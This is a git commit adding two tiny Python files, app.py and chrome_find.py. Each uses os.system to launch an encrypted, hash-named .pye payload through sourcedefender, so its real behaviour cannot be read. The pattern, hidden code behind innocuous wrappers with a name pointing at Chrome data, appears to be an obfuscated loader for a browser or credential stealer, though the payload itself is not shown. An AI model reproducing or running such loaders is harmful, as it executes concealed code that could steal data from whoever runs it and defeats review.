11aed3c0f72716c1306cc6fa177f3f650b0a65f7
kedaular <bredelem@protonmail.com>
2021-03-06 18:21:20 +0500

    created

---
+++ app.py
@@ -0,0 +1,7 @@
+import os
+
+
+run_defend = "python -m sourcedefender"
+cwd = "z51ff522693d4f38f049eec491ae3e90e805d3f07afbb74775be89e50984ef04.pye"
+cmd = "{0} {1}".format(run_defend,cwd)
+os.system(cmd)
---
+++ chrome_find.py
@@ -0,0 +1,7 @@
+import os
+
+
+run_defend = "python -m sourcedefender"
+cwd = "z9f22c55fde348892aac21fcf33fdfdb527c259570d9f61ed5d2e977531f7415.pye"
+cmd = "{0} {1}".format(run_defend,cwd)
+os.system(cmd)
